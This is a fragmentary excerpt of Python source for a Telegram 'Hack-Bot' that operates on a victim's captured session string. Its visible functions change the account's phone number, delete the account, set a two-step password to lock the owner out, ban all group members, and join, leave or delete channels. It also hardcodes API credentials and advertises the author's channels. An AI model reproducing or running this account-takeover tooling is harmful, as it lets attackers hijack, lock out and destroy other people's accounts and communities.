# Powerd By xmalith
# CopyRight https://github.com/iSmart-Boi/Hack-Bot 
...
Bot_Username =os.environ.get("BOT_USERNAME", None) or "Hack_XBot"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@xMalitha"))
...
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    ...
    try:
      ...
      pass
    await X(functions.account.DeleteAccountRequest("I am HackerX"))
...
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    ...
    try:
      ...
      pass
    try:
      await X.edit_2fa('MALITHA IS BEST')
      return True
    except:
      return False
...
'''
mm = '''
**⚜NOTICE FIRST JOIN CHANEEL @CatXGirlNews⚜**
'''
...
keyboard = [
  ...
  [
    Button.url("Owner", "https://t.me/ImRishmika")
    ]
]
...
async def op(event):
  ...
  if not event.is_private:
    ...
    legendbye = [
      [
        Button.url("Must Join", f"https://t.me/CatXGirlNews")
        ]
      ]
...
async def start(event):
  ...
  async with bot.conversation(event.chat_id) as x:
    keyboard = [
      ...
      [
        Button.url("Owner", "https://t.me/xMalitha")
        ]
    ]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Banning all members. Thanks For using  Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply(i + "\n\nThanks For using Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Joined the Channel/Group Thanks For using  Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Leaved the Channel/Group Thanks For using Bot,", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("Deleted the Channel/Group Thanks For using Bot.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if i:
        await event.reply("User don't have two step thats why now two step is `xMalitha Bot Is best` you can login now\n\nThanks For using  Bot.", buttons=keyboard)
      else:
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      try:
        ...
        await event.respond("SEND THIS ERROR TO - @ImRishmika\n**LOGS**\n" + str(e))
...
print("Bot Deploy Successfully SUPPORT : @xMalitha")
